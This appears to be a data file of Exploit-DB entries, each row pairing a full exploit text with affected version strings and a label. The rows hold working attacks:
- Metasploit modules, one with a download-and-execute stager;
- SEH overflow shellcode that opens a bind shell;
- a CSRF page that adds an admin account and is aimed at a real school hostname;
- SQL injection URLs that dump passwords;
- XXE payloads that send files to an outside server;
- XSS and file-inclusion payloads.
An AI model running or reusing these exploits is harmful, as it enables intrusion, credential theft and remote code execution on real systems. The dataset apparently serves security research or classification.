\x31\x6b\x6b\x72\x44\x4c\x4b\x50\x43\x66\x50\x6c\x4b\x33\x70\x64\ \x4c\x6c\x4b\x74\x30\x65\x4c\x4e\x4d\x4e\x6b\x53\x70\x47\x78\x33\ \x6e\x51\x78\x4c\x4e\x52\x6e\x56\x6e\x58\x6c\x50\x50\x59\x6f\x79\ \x46\x70\x66\x62\x73\x75\x36\x75\x38\x66\x53\x64\x72\x42\x48\x53\ \x47\x32\x53\x50\x32\x71\x4f\x71\x44\x49\x6f\x48\x50\x52\x48\x5a\ \x6b\x48\x6d\x6b\x4c\x65\x6b\x70\x50\x4b\x4f\x68\x56\x61\x4f\x4e\ \x69\x4a\x45\x30\x66\x6e\x61\x78\x6d\x67\x78\x73\x32\x42\x75\x52\ \x4a\x75\x52\x6b\x4f\x7a\x70\x61\x78\x6b\x69\x55\x59\x6c\x35\x6e\ \x4d\x51\x47\x4b\x4f\x4e\x36\x70\x53\x50\x53\x56\x33\x76\x33\x43\ \x73\x32\x73\x31\x53\x52\x73\x6b\x4f\x4a\x70\x70\x68\x6f\x30\x6d\ \x78\x35\x50\x46\x61\x30\x66\x30\x68\x76\x64\x6c\x42\x33\x56\x70\ \x53\x4e\x69\x78\x61\x4c\x55\x75\x38\x4a\x4c\x58\x79\x4c\x6a\x73\ \x50\x53\x67\x6b\x4f\x6a\x76\x73\x5a\x72\x30\x73\x61\x53\x65\x4b\ \x4f\x6a\x70\x52\x46\x31\x7a\x52\x44\x73\x56\x50\x68\x51\x73\x50\ \x6d\x32\x4a\x62\x70\x51\x49\x47\x59\x6a\x6c\x6c\x49\x4b\x57\x42\ \x4a\x73\x74\x6d\x59\x6d\x32\x35\x61\x6f\x30\x48\x73\x4f\x5a\x6f\ \x65\x4c\x49\x39\x6d\x4b\x4e\x33\x72\x54\x6d\x6b\x4e\x33\x72\x34\ \x6c\x6c\x4d\x50\x7a\x57\x48\x4e\x4b\x4c\x6b\x6c\x6b\x71\x78\x32\ \x52\x6b\x4e\x6c\x73\x42\x36\x49\x6f\x73\x45\x65\x78\x6b\x4f\x6e\ \x36\x71\x4b\x42\x77\x43\x62\x53\x61\x76\x31\x70\x51\x30\x6a\x35\ \x51\x62\x71\x76\x31\x72\x75\x43\x61\x4b\x4f\x6e\x30\x73\x58\x4e\ \x4d\x7a\x79\x37\x75\x38\x4e\x31\x43\x4b\x4f\x4a\x76\x30\x6a\x39\ \x6f\x6b\x4f\x70\x37\x6b\x4f\x6e\x30\x45\x38\x39\x77\x54\x39\x79\ \x56\x71\x69\x79\x6f\x53\x45\x56\x64\x69\x6f\x69\x46\x6b\x4f\x62\ \x57\x6b\x4c\x4b\x4f\x6a\x70\x50\x68\x6a\x50\x6f\x7a\x37\x74\x43\ \x6f\x72\x73\x4b\x4f\x6a\x76\x79\x6f\x38\x50\x63\ ""'`\ HTTP/1.0\r\n\ Host: $host\r\n\r\n"" | nc -vv $host 80  # milw0rm.com [2007-04-07]",['2.0.58'],1
38118,"Qlikview 11.20 SR11 - Blind XML External Entity Injection Exploit Title: Qlikview blind XXE security vulnerability Product: Qlikview Vulnerable Versions: v11.20 SR11 and previous versions Tested Version: v11.20 SR4 Advisory Publication: 08/09/2015 Latest Update: 08/09/2015 Vulnerability Type: Improper Restriction of XML External Entity Reference [CWE-611] CVE Reference: CVE-2015-3623 Credit: Alex Haynes  Advisory Details:   (1) Vendor & Product Description --------------------------------  Vendor: QLIK  Product & Version: QlikView v11.20 SR4  Vendor URL & Download: http://www.qlik.com/us/explore/products/qlikview  Product Description: ""The QlikView Business Discovery platform delivers true self-service BI that empowers business users by driving innovative decision-making.""   (2) Vulnerability Details: -------------------------- The Qlikview platform is vulnerable to XML External Entity (XXE) vulnerabilities. More specifically, the platform is susceptible to DTD parameter injections, which are also ""blind"" as the server feeds back no visual response. These vulnerabilities can be exploited to force Server Side Request Forgeries (SSRF)in multiple protocols, as well as reading and extracting arbitrary files on the server directly.  Proof of concept for XXE [CVE-2015-5361]: ----------------------------------------- URL: https://<QLIKVIEW>/AccessPoint.aspx  Attack Pattern for SSRF:  ------------------------ In POST body:  <?xml version=""1.0"" encoding=""UTF-8""?> <!DOCTYPE update [ <!ENTITY % external SYSTEM ""http://yourserver.com""> %external;]>  OR simply  <?xml version=""1.0"" encoding=""utf-8""?> <!DOCTYPE roottag PUBLIC ""-//WHITE//NINJA//EN"" ""http://yourserver.com"">  As this is a blind XXE, you will see no response from server, but yourserver.com will receive the HTTP request from the Qlikview server. Also works with FTP and HTTPS protocols.  Attack Pattern for reading and extracting arbitrary files:  ------------------------------------------ In POST body:  <?xml version=""1.0"" encoding=""utf-8""?> <!DOCTYPE roottag [ <!ENTITY % remote SYSTEM ""file:///c:/windows/win.ini""> <!ENTITY % dtd SYSTEM ""http://yourserver.com/test.dtd""> %dtd; %send; ]]>  The test.dtd file on yourserver.com will need to contain the following:  Test.dtd -------- <!ENTITY % all ""<!ENTITY &#x25; send SYSTEM 'http://yourserver.com/?%remote;'>""> %all;  As the response is blind, you will see no response from the server, but yourserver.com will receive the file contents as part of the URL in lieu of the %remote parameter.   (3) Advisory Timeline: ---------------------- 29/04/2015 - First Contact informing vendor of vulnerability 30/04/2015 - Response requesting details of vulnerability. Details sent 05/05/2015 - Vendor indicates issue is under investigation. 06/05/2015 - Vendor confirms vulnerability and has started working on resolving the issue. 20/05/2015 - Vendor confirms root cause has been identified and patch is under internal testing. 08/06/2015 - Vendor confirms patch ready and requests 90 day restraint on vulnerability release to give clients time to patch. 10/06/2015 - Patch 11.20 SR12 released, fixing the vulnerability 08/09/2015 - Public disclosure of vulnerability.   (4)Solution: ------------ Upgrade to QV11.20 SR12 will correct the vulnerability.   (5) Credits: ------------ Discovered by Alex Haynes  References: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3623 http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-3623","['11.20 SR11', 'v11.20 SR11', 'previous versions']",1
38746,"Xibo - Cross-Site Request Forgery source: https://www.securityfocus.com/bid/62064/info  Xibo is prone to a cross-site request-forgery vulnerability.  Exploiting this issue may allow a remote attacker to perform certain unauthorized actions and gain access to the affected application. Other attacks are also possible.  Xibo 1.4.2 is vulnerable; other versions may also be affected.   <html> <head> <title> Xibo - Digital Signage 1.4.2 CSRF Exploit.</title> <!-- # CSRF Discovered by: Jacob Holcomb - Security Analyst @ Independent Security Evaluators # Exploited by: Jacob Holcomb - Security Analyst @ Independnet Security Evaluators # CVE: CSRF - CVE-2013-4889, XSS - CVE-2013-4888 # http://infosec42.blogspot.com # http://securityevaluators.com --> </head> <body> <h1>Please wait... </h1> <script type=""text/javascript""> //Add super user function RF1(){     document.write('<form name=""addAdmin"" target =""_blank"" action=""http://xibo.leland.k12.mi.us/index.php?p=user&q=AddUser&ajax=true"" method=""post"">'+     '<input type=""hidden"" name=""userid"" value=""0"">'+     '<input type=""hidden"" name=""username"" value=""Gimppy"">'+     '<input type=""hidden"" name=""password"" value=""ISE"">'+     '<input type=""hidden"" name=""email"" value=""Gimppy@infosec42.com"">'+     '<input type=""hidden"" name=""usertypeid"" value=""1"">'+     '<input type=""hidden"" name=""groupid"" value=""1"">'+     '</form>'); }  //Set XSS Payloads function RF2(){     document.write('<form name=""addXSS"" target=""_blank"" action=""http://xibo.leland.k12.mi.us/index.php?p=layout&q=add&ajax=true"" method=""post"">'+     '<input type=""hidden"" name=""layoutid"" value=""0"">'+     '<input type=""hidden"" name=""layout"" value=""Gimppy<img src=42 onerror='alert(42)'>"">'+     '<input type=""hidden"" name=""description"" value=""<iframe src='http://securityevaluators.com' width=100 height=1000</iframe>"">'+     '<input type=""hidden"" name=""tags"" value="""">'+     '<input type=""hidden"" name=""templateid"" value=""0"">'+     '</form>'); }  function createPage(){     RF1();     RF2(); }  function _addAdmin(){     document.addAdmin.submit(); }  function _addXSS(){     document.addXSS.submit(); }  //Called Functions createPage()     for (var i = 0; i < 2; i++){     if(i == 0){         window.setTimeout(_addAdmin, 0500);     }     else if(i == 1){         window.setTimeout(_addXSS, 1000);     }     else{         continue;     } } </script> </body> </html>",['1.4.2'],1
10344,"Adobe Illustrator CS4 14.0.0 - eps Universal Buffer Overflow (Metasploit) require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::FILEFORMAT          	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Adobe Illustrator CS4 v14.0.0', 			'Description'    => %q{ 					Adobe Illustrator CS4 (V14.0.0) Encapsulated Postscript (.eps)     overlong DSC Comment Buffer Overflow Exploit  			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'dookie, original by Nine:Situations:Group::pyrokinesis' ], 			'Version'        => '$Revision: 7724 $', 			'References'     => 				[ 					[ 'URL', 'http://www.exploit-db.com/exploits/10281' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				},					 			'Payload'        => 				{ 					'Space'    => 1000, 					'BadChars' => ""\x00\x0D\x0C\x0A"", 					'EncoderType' => Msf::Encoder::Type::AlphanumUpper, 				}, 			'Platform' => 'win', 			'Targets'        =>  				[ 					[ 'Windows Universal', { 'Ret' => 0x4B4B5173 } ], # CALL ESI in icudt36.dll 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Dec 03 2009', 			'DefaultTarget'  => 0))  			register_options( 				[ 					OptString.new('FILENAME',   [ false, 'The file name.',  '9sg.eps']), 				], self.class)  	end  	def exploit 		 		header = ""\xc5\xd0\xd3\xc6\x20\x00\x00\x00\x05\xc8\x04\x00\x00\x00"" 		header << ""\x00\x00\x00\x00\x00\x00%\xc8\x04\x00\xb5I\x01\x00\xff"" 		header << ""\xff\x00\x00"" 		header << ""%!PS-Adobe-3.1\x20EPSF-3.0\r\n"" 		header << ""%ADO_DSC_Encoding:\x20Windows\x20Roman\r\n"" 		header << ""%"" 		sploit = rand_text_alpha(41699) 		sploit << [target.ret].pack('V') 		sploit << rand_text_alpha(2291) 		sploit << ""%Title:\x20Untitled-1.eps\r\n"" 		sploit << ""%AAAAAAAA"" 		sploit << payload.encoded 		trailer = "": A\r\n"" 		trailer << ""%%For:\x20alias\r\n"" 		trailer << ""%%CreationDate:\x2011/27/2009\r\n"" 		trailer += ""%%BoundingBox:\x200\x200\x20227\x20171\r\n"" 		trailer += ""%%HiResBoundingBox:\x200\x200\x20226.5044\x20170.3165\r\n"" 		trailer += ""%%CropBox:\x200\x200\x20226.5044\x20170.3165\r\n"" 		trailer += ""%%LanguageLevel:\x202\r\n"" 		trailer += ""%%DocumentData:\x20Clean7Bit\r\n"" 		trailer += ""%ADOBeginClientInjection:\x20DocumentHeader\x20\""AI11EPS\""\r\n"" 		trailer += ""%%AI8_CreatorVersion:\x2014.0.0\r"" 		trailer += ""%AI9_PrintingDataBegin\r"" 		trailer += ""%ADO_BuildNumber:\x20Adobe\x20Illustrator(R)\x2014.0.0\x20x367\x20R\x20agm\x204.4890\x20ct\x205.1541\r"" 		trailer += ""%ADO_ContainsXMP:\x20MainFirst\r"" 		trailer += ""%AI7_Thumbnail:\x20128\x2096\x208\r"" 		trailer += ""%%BeginData:\x204096\x20Hex\x20Bytes\r"" 		trailer += ""%0000330000660000990000CC0033000033330033660033990033CC0033FF\r\n"" 			 		eps = header + sploit + trailer  		print_status(""Creating '#{datastore['FILENAME']}' file ..."")  		file_create(eps)     	end  end","['14.0.0', '(V14.0.0)']",0
17848,"Measuresoft ScadaPro 4.0.0 - Remote Command Execution (Metasploit) ## # $Id: scadapro_cmdexe.rb 13737 2011-09-16 08:23:59Z sinn3r $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = ExcellentRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::EXE  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Measuresoft ScadaPro <= 4.0.0 Remote Command Execution', 			'Description'    => %q{ 					This module allows remote attackers to execute arbitray commands on  				the affected system by abusing via Directory Traversal attack when using the 'xf' 				command (execute function). An attacker can execute system() from msvcrt.dll to 				upload a backdoor and gain remote code execution. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Luigi Auriemma',                           # Initial discovery/poc 					'mr_me <steventhomasseeley[at]gmail.com>',  # msf 					'TecR0c <tecr0c[at]tecninja.net>',          # msf 				], 			'Version'        => '$Revision: 13737 $', 			'References'     => 				[ 					#[ 'CVE', '?'], 					#[ 'OSVDB', '?'], 					[ 'BID', '49613'], 					[ 'URL', 'http://aluigi.altervista.org/adv/scadapro_1-adv.txt'], 					[ 'URL', 'http://us-cert.gov/control_systems/pdf/ICS-ALERT-11-256-04.pdf'], 					# seemed pretty accurate to us ;) 					[ 'URL', 'http://www.measuresoft.net/news/post/Inaccurate-Reports-of-Measuresoft-ScadaPro-400-Vulnerability.aspx'], 				], 			'DefaultOptions' => 				{ 					'InitialAutoRunScript' => 'migrate -f', 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					# truly universal 					[ 'Automatic', { } ], 				], 			'DefaultTarget'  => 0, 			'DisclosureDate' => 'Sep 16 2011'))  			register_options( 			[ 				Opt::RPORT(11234), 				OptString.new('URIPATH', [ true, ""The URI to use."", ""/"" ]), 			], self.class) 	end  	# couldn't generate a vbs or exe payload and then use the wF command 	# as there is a limit to the amount of data to write to disk. 	# so we just write out a vbs script like the old days.  	def build_vbs(url, stager_name) 		name_xmlhttp = rand_text_alpha(2) 		name_adodb   = rand_text_alpha(2)  		tmp = ""#{@temp_folder}/#{stager_name}""  		vbs  = ""echo Set #{name_xmlhttp} = CreateObject(\""Microsoft.XMLHTTP\"") "" 		vbs << "": #{name_xmlhttp}.open \""GET\"",\""http://#{url}\"",False : #{name_xmlhttp}.send"" 		vbs << "": Set #{name_adodb} = CreateObject(\""ADODB.Stream\"") "" 		vbs << "": #{name_adodb}.Open : #{name_adodb}.Type=1 "" 		vbs << "": #{name_adodb}.Write #{name_xmlhttp}.responseBody "" 		vbs << "": #{name_adodb}.SaveToFile \""#{@temp_folder}/#{@payload_name}.exe\"",2 "" 		vbs << "": CreateObject(\""WScript.Shell\"").Run \""#{@temp_folder}/#{@payload_name}.exe\"",0 >> #{tmp}""  		return vbs 	end  	def on_request_uri(cli, request) 		if request.uri =~ /\.exe/ 			print_status(""Sending 2nd stage payload to #{cli.peerhost}:#{cli.peerport}..."") 			return if ((p=regenerate_payload(cli)) == nil) 			data = generate_payload_exe( {:code=>p.encoded} ) 			send_response(cli, data, {'Content-Type' => 'application/octet-stream'} ) 			return 		end 	end  	def exploit 		# In order to save binary data to the file system the payload is written to a .vbs 		# file and execute it from there. 		@payload_name = rand_text_alpha(4) 		@temp_folder  = ""C:/Windows/Temp""  		if datastore['SRVHOST'] == '0.0.0.0' 			lhost = Rex::Socket.source_address('50.50.50.50') 		else 			lhost = datastore['SRVHOST'] 		end  		payload_src  = lhost 		payload_src << "":"" << datastore['SRVPORT'] << datastore['URIPATH'] << @payload_name << "".exe""  		stager_name = rand_text_alpha(6) + "".vbs"" 		stager      = build_vbs(payload_src, stager_name)  		path = ""..\\..\\..\\..\\..\\windows\\system32""  		createvbs = ""xf%#{path}\\msvcrt.dll,system,cmd /c #{stager}\r\n"" 		download_execute = ""xf%#{path}\\msvcrt.dll,system,start #{@temp_folder}/#{stager_name}\r\n""  		print_status(""Sending 1st stage payload..."")  		connect 		sock.get_once() 		sock.put(createvbs) 		sock.get_once() 		sock.put(download_execute) 		handler() 		disconnect  		super 	end  end",['4.0.0'],1
47012,"Tuneclone 2.20 - Local SEH Buffer Overflow # Exploit Title: TuneClone Local Seh Exploit # Date: 19.06.2019 # Vendor Homepage: http://www.tuneclone.com/ # Software Link:   http://www.tuneclone.com/tuneclone_setup.exe # Exploit Author: Achilles # Tested Version: 2.20 # Tested on: Windows XP SP3 EN              # 1.- Run python code : TuneClone.py # 2.- Open EVIL.txt and copy content to Clipboard # 3.- Open TuneClone and press Help and 'Enter License Code' # 4.- Paste the Content of EVIL.txt into the 'Name and Code Field' # 5.- Click 'OK' and you will have a bind shell port 3110. # 6.- Greetings go:XiDreamzzXi,Metatron  #!/usr/bin/env python  import struct  buffer = ""\x41"" * 1056 nseh = ""\xeb\x06\x90\x90"" #jmp short 6 seh  =  struct.pack('<L',0x583411c0) #msaud32.acm nops =  ""\x90"" * 20  #msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=3110 -e x86/shikata_ga_nai -b ""\x00\x0a\x0d"" -i 1 -f python #badchars ""\x00\x0a\x0d"" shellcode = (""\xb8\xf4\xc0\x2a\xd0\xdb\xd8\xd9\x74\x24\xf4\x5a\x2b""  ""\xc9\xb1\x53\x31\x42\x12\x83\xea\xfc\x03\xb6\xce\xc8"" ""\x25\xca\x27\x8e\xc6\x32\xb8\xef\x4f\xd7\x89\x2f\x2b"" ""\x9c\xba\x9f\x3f\xf0\x36\x6b\x6d\xe0\xcd\x19\xba\x07"" ""\x65\x97\x9c\x26\x76\x84\xdd\x29\xf4\xd7\x31\x89\xc5"" ""\x17\x44\xc8\x02\x45\xa5\x98\xdb\x01\x18\x0c\x6f\x5f"" ""\xa1\xa7\x23\x71\xa1\x54\xf3\x70\x80\xcb\x8f\x2a\x02"" ""\xea\x5c\x47\x0b\xf4\x81\x62\xc5\x8f\x72\x18\xd4\x59"" ""\x4b\xe1\x7b\xa4\x63\x10\x85\xe1\x44\xcb\xf0\x1b\xb7"" ""\x76\x03\xd8\xc5\xac\x86\xfa\x6e\x26\x30\x26\x8e\xeb"" ""\xa7\xad\x9c\x40\xa3\xe9\x80\x57\x60\x82\xbd\xdc\x87"" ""\x44\x34\xa6\xa3\x40\x1c\x7c\xcd\xd1\xf8\xd3\xf2\x01"" ""\xa3\x8c\x56\x4a\x4e\xd8\xea\x11\x07\x2d\xc7\xa9\xd7"" ""\x39\x50\xda\xe5\xe6\xca\x74\x46\x6e\xd5\x83\xa9\x45"" ""\xa1\x1b\x54\x66\xd2\x32\x93\x32\x82\x2c\x32\x3b\x49"" ""\xac\xbb\xee\xe4\xa4\x1a\x41\x1b\x49\xdc\x31\x9b\xe1"" ""\xb5\x5b\x14\xde\xa6\x63\xfe\x77\x4e\x9e\x01\x7b\xa9"" ""\x17\xe7\xe9\xa5\x71\xbf\x85\x07\xa6\x08\x32\x77\x8c"" ""\x20\xd4\x30\xc6\xf7\xdb\xc0\xcc\x5f\x4b\x4b\x03\x64"" ""\x6a\x4c\x0e\xcc\xfb\xdb\xc4\x9d\x4e\x7d\xd8\xb7\x38"" ""\x1e\x4b\x5c\xb8\x69\x70\xcb\xef\x3e\x46\x02\x65\xd3"" ""\xf1\xbc\x9b\x2e\x67\x86\x1f\xf5\x54\x09\x9e\x78\xe0"" ""\x2d\xb0\x44\xe9\x69\xe4\x18\xbc\x27\x52\xdf\x16\x86"" ""\x0c\x89\xc5\x40\xd8\x4c\x26\x53\x9e\x50\x63\x25\x7e"" ""\xe0\xda\x70\x81\xcd\x8a\x74\xfa\x33\x2b\x7a\xd1\xf7"" ""\x5b\x31\x7b\x51\xf4\x9c\xee\xe3\x99\x1e\xc5\x20\xa4"" ""\x9c\xef\xd8\x53\xbc\x9a\xdd\x18\x7a\x77\xac\x31\xef"" ""\x77\x03\x31\x3a"") pad =""C"" * (6000 - len(buffer) - len(nseh+seh) - len(nops) -len(shellcode)) payload = buffer + nseh + seh + nops + shellcode + pad  try: 	f=open(""Evil.txt"",""w"") 	print ""[+] Creating %s bytes evil payload.."" %len(payload) 	f.write(payload) 	f.close() 	print ""[+] File created!"" except: 	print ""File cannot be created""",['2.20'],1
6146,"Pligg CMS 9.9.0 - 'story.php' SQL Injection |___________________________________________________| | |    Pligg Beta 9.9.0 (id) Remote SQL Injection Vulnerability | |___________________________________________________ |---------------------Hussin X----------------------| | |    Author: Hussin X | |    Home :  www.tryag.cc/cc | |    email:  darkangel_g85[at]Yahoo[DoT]com | | |___________________________________________________ |                                                   | | | | script : http://www.pligg.com/ | | DorK   : Powered By Pligg | Legal: License and Source | | version :  9.9.0  |___________________________________________________|    Exploit:     USER :  www.[target].com/Script/story.php?id=-4+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,user_login,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35+from+pligg_users--   PASSWORD :  story.php?id=-4+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,user_pass,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35+from+pligg_users--   EMAIL :  www.[target].com/Script/story.php?id=-4+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,user_email,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35+from+pligg_users--       L!VE DEMO: :  USER :  http://www.pligg.com/demo01/story.php?id=-4+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,user_login,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35+from+pligg_users--  PASSWORD :  http://www.pligg.com/demo01/story.php?id=-4+UNION+SELECT+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,user_pass,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35+from+pligg_users--        ____________________________( Greetz )____________________________ | | tryag.cc | DeViL iRaQ | IRAQ DiveR | IRAQ_JAGUR | str0ke |    | Iraqihack | FAHD | mos_chori | Silic0n  | |_________________________________________________________________                          Im IRAQi  # milw0rm.com [2008-07-28]",['9.9.0'],1
36860,"WordPress Plugin TheCartPress 1.3.9 - Multiple Vulnerabilities Advisory ID: HTB23254 Product: TheCartPress WordPress plugin Vendor: TheCartPress team Vulnerable Version(s): 1.3.9 and probably prior Tested Version: 1.3.9 Advisory Publication:  April 8, 2015  [without technical details] Vendor Notification: April 8, 2015  Public Disclosure: April 29, 2015  Vulnerability Type: Cross-Site Scripting [CWE-79], PHP File Inclusion [CWE-98], Cross-Site Scripting [CWE-79], Improper Access Control [CWE-284] CVE References: CVE-2015-3301, CVE-2015-3300, CVE-2015-3302 Risk Level: High  CVSSv2 Base Scores: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 5 (AV:N/AC:L/Au:N/C:N/I:P/A:N), 4.3 (AV:N/AC:M/Au:N/C:N/I:P/A:N) Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in TheCartPress WordPress plugin, which can be exploited to execute arbitrary PHP code, disclose sensitive data, and perform Cross-Site Scripting attacks against users of WordPress installations with the vulnerable plugin.  1) Local PHP File Inclusion in TheCartPress WordPress plugin: CVE-2015-3301  Input passed via the ""tcp_box_path"" HTTP POST parameter passed to ""/wp-admin/admin.php?page=checkout_editor_settings"" URL is not properly verified before being used in PHP 'include()' function, and can be abused to include arbitrary local files via directory traversal sequences.  In order to successfully exploit the vulnerability an attacker needs to have administrator privileges on WordPress installation, however this can be also exploited via CSRF vector to which the script is vulnerable as well.   Simple CSRF exploit below will execute the content of '/etc/passwd' file when a logged-in administrator will visit a page with it:  <form action=""http://wordpress/wp-admin/admin.php?page=checkout_editor_settings"" method=""post"" name=""main""> <input type=""hidden"" name=""tcp_save_fields""  value='1'> <input type=""hidden"" name=""tcp_box_path""  value='../../../../../etc/passwd'> <input type=""submit"" id=""btn""> </form> <script>  document.main.submit(); </script>    2) Stored XSS in TheCartPress WordPress plugin: CVE-2015-3300  During the checkout process, many user-supplied HTTP POST parameters (see complete list in PoC)in ""Shipping address"" and ""Billing address"" sections are not being sanitized before being stored in the local database.   Simple mass-XSS PoC against ""Billing address"" section (PoC against ""Shipping address"" scetion is identical, just replace 'billing_' prefix with 'shipping_') will write several JS pop-up alerts into the application database:  <form action=""http://wordpress/shopping-cart/checkout/"" method=""post"" name=""main""> <input type=""hidden"" name=""selected_billing_id""  value='1'> <input type=""hidden"" name=""selected_billing_address""  value='new'> <input type=""hidden"" name=""billing_firstname""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_lastname""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_company""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_tax_id_number""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_country_id""  value='AF'> <input type=""hidden"" name=""billing_region_id""  value=''> <input type=""hidden"" name=""billing_region""  value=''> <input type=""hidden"" name=""billing_city""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_street""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_street_2""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_postcode""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_telephone_1""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_telephone_2""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_fax""  value='""><script>alert(/immuniweb/);</script>'> <input type=""hidden"" name=""billing_email""  value='mail@mail.com'> <input type=""hidden"" name=""tcp_continue""  value=''> <input type=""hidden"" name=""tcp_step""  value='1'> <input type=""submit"" id=""btn""> </form>   A non-authenticated attacker may inject malicious HTML and JS code that will be stored in the application database, and available to any non-authenticated user on the following URL:  http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order  As well as on the following URL accessible to WordPress administrator only:  http://wordpress/wp-admin/admin.php?page=thecartpress/admin/OrdersListTable.php   3) Improper Access Control in TheCartPress WordPress plugin: CVE-2015-3302  Any non-authenticated user may browse orders of other users due to broken authentication mechanism. To reproduce the vulnerability an attacker shall first open the following URL: http://wordpress/shopping-cart/checkout/?tcp_checkout=ok&order_id=[order_id]  And just after open the following URL to see full order details: http://wordpress/wp-admin/admin-ajax.php?order_id=[order_id]&action=tcp_print_order  Moreover, the order ID can be easily predicted, as every new order ID is an incremented value of the previous one. This enables non-authenticated remote attacker to steal all currently-existing orders.   4) Multiple XSS in TheCartPress WordPress plugin (against administrator only): CVE-2015-3300  4.1 Input passed via the ""search_by"" GET parameter to ""/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php"" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.  http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressesList.php&search_by=--%3E%%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E  4.2 Input passed via the ""address_id"", ""address_name"", ""firstname"", ""lastname"", ""street"", ""city"", ""postcode"", ""email"" GET parameters to ""/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php"" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.  http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&address_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&address_name=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&firstname=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&lastname=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&street=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&city=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&postcode=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AddressEdit.php&email=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E  4.3 Input passed via the ""post_id"" and ""rel_type"" GET parameters to ""/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php"" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.  http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php&post_id=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E http://wordpress/wp-admin/admin.php?page=thecartpress/admin/AssignedCategoriesList.php&post_id=1&rel_type=%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E  4.4 Input passed via the ""post_type"" GET parameter to ""/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php"" is not properly sanitised before being returned to the user. A remote attacker can trick logged-in administrator to open a specially crafted link and execute arbitrary HTML and script code in browser in context of the vulnerable website.  http://wordpress/wp-admin/admin.php?page=thecartpress/admin/CustomFieldsList.php&post_type=1--%3E%27%22%3E%3Cscript%3Ealert%28%27immuniweb%27%29;%3C/script%3E  -----------------------------------------------------------------------------------------------  Solution:  2015-04-08 Vendor Alerted via emails. 2015-04-17 Vendor Alerted via contact form and emails. 2015-04-17 Vendor Alerted via WordPress Support 